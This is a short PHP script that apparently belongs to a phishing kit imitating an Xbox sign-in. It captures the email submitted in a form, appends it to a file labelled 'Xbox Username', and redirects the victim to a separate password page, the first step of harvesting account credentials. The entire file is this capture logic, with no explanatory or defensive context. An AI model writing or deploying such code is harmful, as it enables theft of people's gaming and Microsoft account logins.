<?php

file_put_contents("usernames.txt", "Xbox Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: pass.html');
?>
